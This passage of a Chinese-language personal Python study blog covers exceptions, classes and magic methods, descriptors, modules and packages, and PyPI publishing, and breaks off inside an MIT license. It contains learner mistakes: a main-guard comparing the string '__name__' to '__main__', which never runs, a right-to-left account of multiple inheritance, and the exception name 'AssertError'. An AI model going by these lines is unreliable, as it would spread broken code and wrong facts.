style="zoom:50%;"></td></tr></tbody></table><p>也可以进一步简化，对数据进行元组<strong>打包</strong>和<strong>解包</strong>，按照元组的形式<code>dump()</code>和<code>load()</code>，例如：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708120108133.png" alt="image-20230708120108133" style="zoom:50%;"><p>依然正常运行</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708120144187.png" alt="image-20230708120144187" style="zoom:50%;"><h3 id="2、异常"><a href="#2、异常" class="headerlink" title="2、异常"></a>2、异常</h3><h4 id="（1）异常类型"><a href="#（1）异常类型" class="headerlink" title="（1）异常类型"></a>（1）异常类型</h4><p>一个完成的编程语言，会在代码报错后，抛出一个异常，告诉你哪里出错、出错类型。</p><blockquote><p> 编程时，可以人为的<strong>捕获</strong>这种异常，以实现特定操作。</p></blockquote><p><strong>异常</strong>分为很多类型，常见的有：<code>ZeroDivisionError</code>、<code>TypeError</code>、<code>NameError</code>等等</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708164248600.png" alt="image-20230708164248600" style="zoom:50%;"><h4 id="（2）捕获异常：try-except语句"><a href="#（2）捕获异常：try-except语句" class="headerlink" title="（2）捕获异常：try-except语句"></a>（2）捕获异常：try-except语句</h4><ol><li>捕获所有异常</li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230708164745991.png" alt="image-20230708164745991" style="zoom:50%;"><ol start="2"><li><p>只捕获特定异常</p><blockquote><p><strong>同时</strong>捕获多个异常时，需要将其构成一个元组</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230708165054719.png" alt="image-20230708165054719" style="zoom:50%;"></li><li><p>捕获多个异常，单独分开处理</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708165527519.png" alt="image-20230708165527519" style="zoom:50%;"></li></ol><h4 id="（3）try-except-else语句"><a href="#（3）try-except-else语句" class="headerlink" title="（3）try-except-else语句"></a>（3）try-except-else语句</h4><p><code>try-except-else</code>语句，表示当<code>try-except</code>没有发生异常，则执行<code>else</code>中的语句</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708165950299.png" alt="image-20230708165950299" style="zoom:50%;"><p><strong>注意</strong>，如果发生异常，但未被<code>try-except</code>捕获（当只捕获特定异常时），此时程序会发生报错。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708170124411.png" alt="image-20230708170124411" style="zoom:50%;"><h4 id="（4）try-except-finally语句"><a href="#（4）try-except-finally语句" class="headerlink" title="（4）try-except-finally语句"></a>（4）try-except-finally语句</h4><p>表示无论<code>try-except</code>是否捕获异常，都要执行<code>finally</code>中的工作。</p><blockquote><p>即一般不在<code>try-except</code>之外写代码（实际可以），如果需要，则用<code>finally</code></p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230708170943603.png" alt="image-20230708170943603" style="zoom:50%;"><p><code>finally</code>一般用于收尾工作，例如关闭文件等操作</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708171255688.png" alt="image-20230708171255688" style="zoom:50%;"><p>所以，异常语句主要包含下图：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708171454673.png" alt="image-20230708171454673" style="zoom:50%;"><img src="https://gitee.com/cht1/Image/raw/master/image-20230708171519268.png" alt="image-20230708171519268" style="zoom:50%;"><h4 id="（5）异常的嵌套"><a href="#（5）异常的嵌套" class="headerlink" title="（5）异常的嵌套"></a>（5）异常的嵌套</h4><p>如下图：先触发内部异常，再除法外部异常。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708171851648.png" alt="image-20230708171851648" style="zoom:50%;"><p>如果换种写法，先触发外部异常，则不再执行内部语句。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708172236227.png" alt="image-20230708172236227" style="zoom:50%;"><h4 id="（6）raise语句"><a href="#（6）raise语句" class="headerlink" title="（6）raise语句"></a>（6）raise语句</h4><p><code>raise</code>语句，主动抛出一个异常。比如：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708172730266.png" alt="image-20230708172730266" style="zoom:50%;"><p><strong>异常链</strong>：<code>from</code></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708173214352.png" alt="image-20230708173214352" style="zoom:50%;"><h4 id="（7）assert语句"><a href="#（7）assert语句" class="headerlink" title="（7）assert语句"></a>（7）assert语句</h4><p><code>assert</code>语句，<strong>断言</strong>，判断语句是否为真，为假则抛出异常：<code>AssertError</code></p><blockquote><p>该语句 有助于调试。</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230708173851443.png" alt="image-20230708173851443" style="zoom:50%;"><h4 id="（8）利用异常实现goto"><a href="#（8）利用异常实现goto" class="headerlink" title="（8）利用异常实现goto"></a>（8）利用异常实现goto</h4><p>利用异常，实现C语言中的<code>goto</code>语句。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230708174054819.png" alt="image-20230708174054819" style="zoom:50%;"><p>其实就是，在<code>try-except</code>语句，利用<code>raise</code>语句，主动抛出特定异常，然后利用<code>except</code>接收特定异常，实现<strong>向下</strong>跳转。</p><h2 id="八、python类和对象"><a href="#八、python类和对象" class="headerlink" title="八、python类和对象"></a>八、python类和对象</h2><p>面向对象：OO编程，一种代码<strong>封装</strong>的能力。</p><h3 id="1、基础"><a href="#1、基础" class="headerlink" title="1、基础"></a>1、基础</h3><p>类：<code>class</code></p><p>属性：类中的变量</p><p>方法：类中的函数，参数至少有一个<code>self</code>参数，通过<code>self</code>使用类中的属性</p><blockquote><p>类就像一个封装容器，每个类以及不同的类变量，是隔绝的。</p></blockquote><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230709151012514.png" alt="image-20230709151012514" style="zoom:50%;"><p>当初始化一个类后，则成为<code>实例对象</code>，给<code>实例对象</code>添加属性，只需要使用<code>a.new = value</code>即可</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230710231301079.png" alt="image-20230710231301079" style="zoom:50%;"><p><code>c.__dict__</code>：查看实例类的属性，类用字典来存储类属性，（只显示被调用过的）</p><p>可以用一个空类来表示类属性</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230710231842339.png" alt="image-20230710231842339" style="zoom:50%;"><h3 id="2、特性"><a href="#2、特性" class="headerlink" title="2、特性"></a>2、特性</h3><h4 id="（1）继承"><a href="#（1）继承" class="headerlink" title="（1）继承"></a>（1）继承</h4><p><strong>子类</strong>：通过继承创建的类</p><p><strong>父类</strong>：被继承的类，也称为基类、超类。</p><p><strong>子类能够获得父类的属性和方法。</strong></p><p>python里，继承的写法很简单（比C++、java），直接写在类名右侧括号里。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230709151503265.png" alt="image-20230709151503265" style="zoom:50%;"><p>若子类中出现同名属性或者方法，则<strong>覆盖</strong>父类，即：<strong>重写</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230709152055351.png" alt="image-20230709152055351" style="zoom:50%;"><p>多重继承：如下图，类C会从右往左，依次继承，并实现覆盖。</p><blockquote><p> 先继承B，然后继承A，对继承B的属性和方法进行覆盖。</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230709155138637.png" alt="image-20230709155138637" style="zoom:50%;"><h4 id="（2）组合"><a href="#（2）组合" class="headerlink" title="（2）组合"></a>（2）组合</h4><p>同时在一个类中，实例化另一个类。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230709160100483.png" alt="image-20230709160100483" style="zoom:50%;"><h4 id="（3）绑定"><a href="#（3）绑定" class="headerlink" title="（3）绑定"></a>（3）绑定</h4><p><code>self</code>：代表实例对象本身，起作用为<strong>绑定</strong>，即实例对象跟类方法<strong>绑定</strong>，故类方法的参数一定要有<code>self</code></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230710230104140.png" alt="image-20230710230104140" style="zoom:50%;"><h4 id="（4）构造函数"><a href="#（4）构造函数" class="headerlink" title="（4）构造函数"></a>（4）构造函数</h4><p><strong>构造函数</strong>：<code>def __init__(self,*args)</code></p><p>即实例化类时的初始函数，用于个性化定制类。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230710232534065.png" alt="image-20230710232534065" style="zoom:50%;"><h4 id="（5）super-init"><a href="#（5）super-init" class="headerlink" title="（5）super().__init()"></a>（5）super().__init()</h4><p><strong>调用未绑定的父类方法</strong>：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230710233218521.png" alt="image-20230710233218521" style="zoom:50%;"><p><strong>砖石继承</strong>：即多次初始化父类，调用父类的<code>__init__()</code>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230714231244782.png" style="zoom:50%;"><p>上图则构成了<strong>砖石继承</strong>，在初始化实例C对象时，会初始化两次实例对象A（父类），执行结果如下图：</p><blockquote><p>看似符合代码逻辑，但会造成重复初始化，资源浪费等一系列问题。</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230710234413202.png" alt="image-20230710234413202" style="zoom:50%;"><p>如何实现，初始化实例对象C时，只初始化一遍父类对象。</p><p><code>super().__init__()</code>：调用该函数，会初始化所有父类，同时系统自动向上遍历，查找父类是否已初始化，不会重复初始化。写法如下：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711000037138.png" alt="image-20230711000037138" style="zoom:50%;"><p>当使用多继承时，<code>super()</code> 方法按照<strong>方法解析顺序</strong>（<strong>MRO</strong>）顺序调用父类的构造函数。在这个例子中，<code>C</code> 类继承自 <code>B1</code> 和 <code>B2</code> 类，而这两个类都继承自 <code>A</code> 类。因此，<code>super().__init__()</code> 在构造函数中的每个子类中被调用，确保所有父类的构造函数都被正确初始化。</p><p>要查看类的<strong>方法解析顺序</strong>（Method Resolution Order，MRO），你可以使用类的 <code>__mro__</code> 属性或 <code>mro()</code> 方法。这些方法都提供了类的方法解析顺序的元组。从左到右按照继承的顺序列出。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711000343777.png" alt="image-20230711000343777" style="zoom:50%;"><h4 id="（6）多态"><a href="#（6）多态" class="headerlink" title="（6）多态"></a>（6）多态</h4><p>简单来说，同一个函数名，但接收参数不同，实现功能则不同，例如<code>len()</code>方法就实现了<strong>多态</strong></p><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230711231330974.png" alt="image-20230711231330974" style="zoom:50%;"><p>利用<strong>重写</strong>，实现多态：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711231527157.png" alt="image-20230711231527157" style="zoom:50%;"><p>运行结果：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711231547820.png" alt="image-20230711231547820" style="zoom:50%;"><p>函数中实现多态：</p><p><strong>前提</strong>：在多个类中<strong>有相同的类方法名</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711231711841.png" alt="image-20230711231711841" style="zoom:50%;"><p>然后，定义函数时，通过传入实参类调用同名类方法：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230714231338877.png" alt="image-20230714231338877" style="zoom:50%;"><h4 id="（7）私有变量和-slots"><a href="#（7）私有变量和-slots" class="headerlink" title="（7）私有变量和__slots__"></a>（7）私有变量和<code>__slots__</code></h4><p>不同于java、c++的面向对象，python中<strong>没有</strong>严格意义上的<strong>私有变量</strong>。</p><p>python类实现私有化：通过在变量名、类方法前面加上双下划线<code>__</code>，表面该变量或方法为<strong>私有属性</strong>或<strong>私有方法</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711233219374.png" alt="image-20230711233219374" style="zoom:50%;"><p>但python并<strong>没有做到真正的</strong>私有化，只是通过将私有属性改名，实现假的私有化，可通过内省<code>__dict__</code>查看有哪些私有属性，且所有私有属性重命名方法一致。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711233514765.png" alt="image-20230711233514765" style="zoom:50%;"><p>私有方法也是同理，实现重命名。</p><p>而如果在后期用该重命名方法添加属性，并不会被重命名：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230711235835959.png" alt="image-20230711235835959" style="zoom:50%;"><p>**<code>__slots__</code>**属性，是一个列表，存储该类的属性名称字符串，后续不允许任何方法再添加的其余属性。</p><blockquote><p><code>__slots__</code>中定义的属性，不会存放于字典中，而是一块固定的内存。</p><p>故相对节省内存，但失去了灵活性。</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230712000209881.png" alt="image-20230712000209881" style="zoom:50%;"><p><strong>注意</strong>：父类的<code>__slots__</code>属性，不会在子类中生效。</p><h3 id="3、魔法方法"><a href="#3、魔法方法" class="headerlink" title="3、魔法方法"></a>3、魔法方法</h3><p>魔法方法很多，可以查询网页：<a href="https://rgb-24bit.github.io/blog/2018/python-special-method.html">Python 魔法方法</a>、<a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/a-guide-to-pythons-magic-methods.html">Python 魔术方法指南（含如何调用）</a></p><p>实质是进行<strong>“劫持”</strong>操作。</p><h4 id="（1）基础魔法方法"><a href="#（1）基础魔法方法" class="headerlink" title="（1）基础魔法方法"></a>（1）基础魔法方法</h4><p><code>__init__(self[,...)</code>：在类实例化对象时（初始化时），被自动调用。</p><p><code>__new__(cls[,...)</code>：参与构建对象，在<code>__init__</code>方法前被构建，<code>cls</code>是类。</p><blockquote><p>所以类的创建为，先通过<code>__new__</code>方法创建实例，再调用<code>__init__</code>方法，进行个性化定制</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230715113512803.png" alt="image-20230715113512803" style="zoom:50%;"><p><code>__del__(self)</code>：销毁函数时候调用。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230712232151847.png" alt="image-20230712232151847" style="zoom:50%;"><p>其余魔法方法，例如<code>__add__(self, other)</code>，实现加法, 如 <code>A + B</code>，通过重写魔法方法，实现个性化操作</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715113725536.png" alt="image-20230715113725536" style="zoom:50%;"><p>魔法方法很多，可以查询网页：<a href="https://rgb-24bit.github.io/blog/2018/python-special-method.html">Python 魔法方法</a>、<a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/a-guide-to-pythons-magic-methods.html">Python 魔术方法指南（含如何调用）</a></p><p>实质是进行<strong>“劫持”</strong>操作。</p><h4 id="（2）属性访问相关魔法方法"><a href="#（2）属性访问相关魔法方法" class="headerlink" title="（2）属性访问相关魔法方法"></a>（2）属性访问相关魔法方法</h4><p>属性方法的<code>BIF()</code>函数，专门用于类对象的属性访问：</p><p><code>hasattr(类对象,属性名字符串)</code>：有则返回True，否则返回False</p><p><code>getattr(类对象,属性名字符串)</code></p><p><code>setattr(类对象,属性名字符串,value)</code></p><p><code>delattr(类对象,属性名字符串)</code></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715120501503.png" alt="image-20230715120501503" style="zoom:50%;"><p>拦截<code>getattr()</code>，而<code>getattr()</code>对应的是<code>getattribute()</code>魔法方法：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715121007225.png" alt="image-20230715121007225" style="zoom: 50%;"><p><strong>注意</strong>：并不存在<code>FishC</code>属性，依然触发<code>getattribute</code>。说明以类属性名访问是<code>c.name</code>，实际上是调用<code>getattribute()</code>魔法方法访问。</p><h4 id="（3）索引、切片、迭代协议"><a href="#（3）索引、切片、迭代协议" class="headerlink" title="（3）索引、切片、迭代协议"></a>（3）索引、切片、迭代协议</h4><p>实例类可以被索引、被切片，通过魔法方法设置：</p><p><code>__getitem__(self)</code>：拦截实例类被索引、切片的操作，以及一些将类作为可迭代对象的操作。</p><p><code>__setitem__(self)</code>：拦截实力类通过索引、切面进行设置的操作</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715162431753.png" alt="image-20230715162431753" style="zoom:50%;"><p>对于迭代协议，</p><p>当一个对象定义了<code>__iter__(self)</code>魔法方法，他就是一个<strong>可迭代对象</strong></p><p>当一个对象定义了<code>__next__(self)</code>魔法方法，他就是一个<strong>迭代器</strong></p><blockquote><p>列表是一个可迭代对象，不是迭代器，因为没有<code>__next__(self)</code>魔法方法</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715162911969.png" alt="image-20230715162911969" style="zoom:50%;"></blockquote><p>用类对象来模拟一个迭代器，即定义类对象的<code>__iter__(self)</code>和<code>__next__(self)</code>魔法方法。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715163903238.png" alt="image-20230715163903238" style="zoom:50%;"><h4 id="（4）魔法方法-代偿"><a href="#（4）魔法方法-代偿" class="headerlink" title="（4）魔法方法 代偿"></a>（4）魔法方法 代偿</h4><p><code>__contains__(self)</code>：该魔法方法实现<strong>成员关系的检测</strong>，对应的运算符为<code>in</code>和<code>not in</code></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715171333276.png" alt="image-20230715171333276" style="zoom:50%;"><p>如果未定义<code>__contains__(self)</code>魔法方法，python会<strong>代偿</strong>地去寻找<code>__iter__(self)</code>魔法方法，然后再寻找<code>__next__(self)</code>魔法方法；</p><p>如果<code>__iter__(self)</code>和<code>__next__(self)</code>也没有，则再次<strong>代偿</strong>寻找<code>__getitem__(self)</code>；如果还是没有，则再次<strong>代偿</strong>……</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715172138844.png" alt="image-20230715172138844" style="zoom:50%;"><p>python可以关闭这种代偿行为，即明确表明不需要。通过给魔法方法赋值为<code>None</code>即可。<code>__contains__ = None</code></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715172836890.png" alt="image-20230715172836890" style="zoom:50%;"><h4 id="（5）常用魔法方法"><a href="#（5）常用魔法方法" class="headerlink" title="（5）常用魔法方法"></a>（5）常用魔法方法</h4><p><code>__call__(self)</code>：让类对象像函数一样被引用。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715175908508.png" alt="image-20230715175908508" style="zoom:50%;"><p>还可以这样：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715180014692.png" alt="image-20230715180014692" style="zoom:50%;"><h3 id="4、高阶使用"><a href="#4、高阶使用" class="headerlink" title="4、高阶使用"></a>4、高阶使用</h3><h4 id="（1）property"><a href="#（1）property" class="headerlink" title="（1）property()"></a>（1）property()</h4><p><code>property()</code>函数：将类地多个方法重命名为一个名字，并具有<strong>多态</strong>属性。基本使用如下：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715182906960.png" alt="image-20230715182906960" style="zoom:50%;"><p>利用<code>property()</code>函数作为<strong>装饰器</strong>，很容易创建<strong>只读属性</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715183244096.png" alt="image-20230715183244096" style="zoom:50%;"><p>上述装饰器地实现原理，是利用<code>property()</code>函数，只创建获取函数，而为创建设置函数：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715183739198.png" alt="image-20230715183739198" style="zoom:50%;"><p>即<code>@property</code>装饰器只对应获取获取方法，而实际上<code>property</code>属性对象提供了<code>getter</code>、<code>setter</code>、<code>deleter</code>三个方法，分别对应<code>property()</code>函数的三个接口。使用方法如下：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715184357682.png" alt="image-20230715184357682" style="zoom:50%;"><h4 id="（2）类方法、静态方法"><a href="#（2）类方法、静态方法" class="headerlink" title="（2）类方法、静态方法"></a>（2）类方法、静态方法</h4><p><strong>类方法</strong><code>@classmethod</code>：用于绑定类，而非类对象。通过<code>@classmethod</code>装饰器来实现。</p><blockquote><p>即站在类本身的角度，而非实力类的角度。</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230715190440435.png" alt="image-20230715190440435" style="zoom:50%;"><p>类方法一般用于自动化处理该类（初始化的所有<strong>同类型实例类</strong>），例如获取<strong>该类型实例类</strong>的个数：</p><p><strong>注意</strong>：在下图中</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715191733997.png" alt="image-20230715191733997" style="zoom:50%;"><p>并且，通过类方法访问的类属性，不会被覆盖，例如下图，重复定义count属性，<code>get_count</code>类方法依然返回3个对象。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715191310351.png" alt="image-20230715191310351" style="zoom:50%;"><p><strong>静态方法</strong><code>staticmethod</code>：实现在类里面定义一个<strong>不需要绑定</strong>的函数（即拿不到类本身<code>self</code>或<code>cls</code>）。通过<code>staticmethod</code>来实现</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230715193050348.png" alt="image-20230715193050348" style="zoom:50%;"><p>效果和使用方法都与<strong>类方法</strong>差不多，也不同担心对象覆盖属性的问题，因为在<strong>静态方法</strong><code>@staticmethod</code>中声明了对属性的获取</p><h4 id="（3）描述符及property实现原理"><a href="#（3）描述符及property实现原理" class="headerlink" title="（3）描述符及property实现原理"></a>（3）描述符及property实现原理</h4><p><strong>描述符</strong>：只要实现了<code>__get__(self,instance,owner)</code>、<code>__set__(self,instance,value)</code>、<code>__delete__(self,instance)</code>三个魔法方法中一个或多个的类，则称为描述符。</p><blockquote><p>三个魔法方法分别拦截读取、写入、删除</p></blockquote><p>测试例子如下：可以看出，<code>instance</code>参数表示实例类，<code>owner</code>参数表示当前类</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716122111674.png" alt="image-20230716122111674" style="zoom:50%;"><img src="https://gitee.com/cht1/Image/raw/master/image-20230716122153667.png" alt="image-20230716122153667" style="zoom:50%;"><p>利用描述符，实现<code>property()</code>函数：</p><blockquote><p>还可以实现<code>@property</code>装饰器</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230716122402035.png" alt="image-20230716122402035" style="zoom:50%;"><h4 id="（4）数据描述符、非数据描述符"><a href="#（4）数据描述符、非数据描述符" class="headerlink" title="（4）数据描述符、非数据描述符"></a>（4）数据描述符、非数据描述符</h4><p>描述符只能运用于类属性，不能运用于对象属性。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716170021979.png" alt="image-20230716170021979" style="zoom:50%;"><p>关于数据描述符和非数据描述符的定义：</p><blockquote><p>只要定义了<code>__set__()</code>和<code>__delete__()</code>其中一个魔法方法，则称为数据描述符，具有最高优先级，不会被覆盖。</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230716165800026.png" style="zoom: 33%;"><p>优先级：</p><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230716165837955.png" alt="image-20230716165837955" style="zoom:25%;"><p>即：如果是<strong>非数据描述符</strong>，那么定义了<strong>重名</strong>的<strong>实例对象属性</strong>，则会<strong>覆盖非数据描述符</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716170435246.png" alt="image-20230716170435246" style="zoom:50%;"><p>而对应优先级最高的<strong>数据描述符</strong>，则无法被覆盖。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716172246946.png" alt="image-20230716172246946" style="zoom:50%;"><h4 id="（5）类装饰器"><a href="#（5）类装饰器" class="headerlink" title="（5）类装饰器"></a>（5）类装饰器</h4><blockquote><p>太难了，，学不懂，感觉暂时我用不到，用到再学。。。</p></blockquote><h4 id="（6）type函数"><a href="#（6）type函数" class="headerlink" title="（6）type函数"></a>（6）type函数</h4><img src="https://gitee.com/cht1/Image/raw/master/image-20230716180632987.png" alt="image-20230716180632987" style="zoom:50%;"><h4 id="（7）元类"><a href="#（7）元类" class="headerlink" title="（7）元类"></a>（7）元类</h4><p>所有类的父类，最最最顶层的父类。</p><h4 id="（8）抽象基类"><a href="#（8）抽象基类" class="headerlink" title="（8）抽象基类"></a>（8）抽象基类</h4><p>指在父类中通过装饰器<code>@abstractmethod</code>定义抽象方法（内容为空<code>pass</code>），在子类中必须<strong>重写</strong>实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br></code></pre></td></tr></table></figure><img src="https://gitee.com/cht1/Image/raw/master/image-20230716183011732.png" alt="image-20230716183011732" style="zoom:50%;"><p>故需要在子类中<strong>重写</strong>抽象类方法，则不会报错：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716183045866.png" alt="image-20230716183045866" style="zoom:50%;"><h2 id="九、模块和包"><a href="#九、模块和包" class="headerlink" title="九、模块和包"></a>九、模块和包</h2><h3 id="1、模块调用"><a href="#1、模块调用" class="headerlink" title="1、模块调用"></a>1、模块调用</h3><p>python的模块称为module，不像C&#x2F;C++里的DLL那么复杂，直接将封装的函数写入一个py文件，再在另一个py文件里<code>import</code>或者<code>from module import xxxx</code>即可。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716220232625.png" alt="image-20230716220232625" style="zoom:33%;"><p><strong>注意</strong>：<strong>较迟导入模块</strong>中的方法，会覆盖<strong>较早导入模块</strong>中的方法，所以尤其注入导入模块方法<strong>重名问题</strong></p><p>为了避免上述问题，导入模块时一般不用<code>from module import *</code>来导入所有模块，而用<code>import module</code>，然后通过<code>module.method</code>来调用<strong>指定模块</strong>中的指定方法。</p><h3 id="2、模块导入"><a href="#2、模块导入" class="headerlink" title="2、模块导入"></a>2、模块导入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;__name__&quot;</span> == <span class="hljs-string">&quot;__main__&quot;</span>:<br></code></pre></td></tr></table></figure><p>当模块被导入时，模块中的所有正常独立语句都会被执行一遍（即模块定义的函数、类不会被执行，而函数函数、类之外的独立语句会被执行）。</p><p>为了避免上述情况，则在主程序中设置<code>if &quot;__name__&quot; == &quot;__main__&quot;:</code></p><p>而当py文件作为模块导入时，则其<code>__name__</code>不是<code>__main__</code>，而是模块的名字</p><h3 id="3、包"><a href="#3、包" class="headerlink" title="3、包"></a>3、包</h3><p>包，即<code>package</code>，支持我们将py文件分门别类放到不同的子文件夹中。</p><p>调用时，则在用相对路径调用<code>import package.module</code>，此时，其<code>__name__</code>为<code>package.module</code>。</p><blockquote><p>注意，在python3.3以前的版本，需要在子包文件中创建一个<code>__init__.py</code>的文件，作为包的构造文件，用于初始化操作，可以是空的。</p></blockquote><p><code>__all__</code>属性，</p><p>用于<strong>模块导入</strong>时，直接写在模块中，指定该模块可被导出的内容（方法、属性）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__all__ = [<span class="hljs-string">&quot;methond_1&quot;</span>,<span class="hljs-string">&quot;method_2&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>]<br></code></pre></td></tr></table></figure><p>用于<strong>包导入</strong>时，一般在<code>__init__.py</code>中使用<code>__all__</code>属性（一个列表），指定<code>from module import *</code>可导入的内容。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__all__ = [<span class="hljs-string">&quot;module1&quot;</span>,<span class="hljs-string">&quot;module2&quot;</span>]<br></code></pre></td></tr></table></figure><img src="https://gitee.com/cht1/Image/raw/master/image-20230716224827366.png" alt="image-20230716224827366" style="zoom:33%;"><h3 id="4、共享代码"><a href="#4、共享代码" class="headerlink" title="4、共享代码"></a>4、共享代码</h3><p>下载包：<code>pip install --upgrade ***</code>（<code>--upgrade</code>表示最新版本）</p><p>上传包：如下</p><p>如何与全世界程序员共享python代码，将自己的python代码发布到Pypi（Python Package Index）上？</p><blockquote><p>在命令行使用<code>pip</code>工具下载第三方模块时，即在Pypi下载。</p></blockquote><p>官方的介绍：<a href="https://packaging.python.org/en/latest/tutorials/packaging-projects/">How do I package and publish my code for PyPI?</a></p><p>首先要去Pypi官网注册一个账号：<a href="https://pypi.org/">Pypi官网</a></p><p>然后准备我们要上传的文件，文件的部署框架如下：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716230611375.png" alt="image-20230716230611375" style="zoom:33%;"><ol><li><p>LICENSE文件，指定一个许可证书，开源许可证。</p><p>去开源许可证网站选择一种许可证：<a href="https://choosealicense.rustwiki.org/">https://choosealicense.rustwiki.org/</a></p><p>选择比较简单的MIT许可证，将其复制下来，粘贴到LICENSE文件中即可（用文本编辑器打开）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">MIT License<br><br>Copyright (c) [year] [fullname]<br><br>Permission <span class="hljs-keyword">is</span> hereby granted, free of charge, to <span class="hljs-built_in">any</span> person obtaining a copy<br>of this software <span class="hljs-keyword">and</span> associated documentation files (the <span class="hljs-string">&quot;Software&quot;</span>), to deal<br><span class="hljs-keyword">in</span> the Software without restriction, including without limitation the rights<br>to use, copy, modify, merge, publish, distribute, sublicense, <span class="hljs-keyword">and</span>/<span class="hljs-keyword">or</span> sell<br>copies of the Software, <span class="hljs-keyword">and</span> to permit persons to whom the Software <span class="hljs-keyword">is</span><br>furnished to do so, subject to the following conditions:<br><br>The above copyright notice <span class="hljs-keyword">and</span> this permission notice shall be included <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span><br>copies <span class="hljs-keyword">or</span> substantial portions of the Software.<br><br>THE SOFTWARE IS PROVIDED <span class="hljs-string">&quot;AS IS&quot;</span>, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR<br>IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,<br>FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE<br>AUTHORS OR 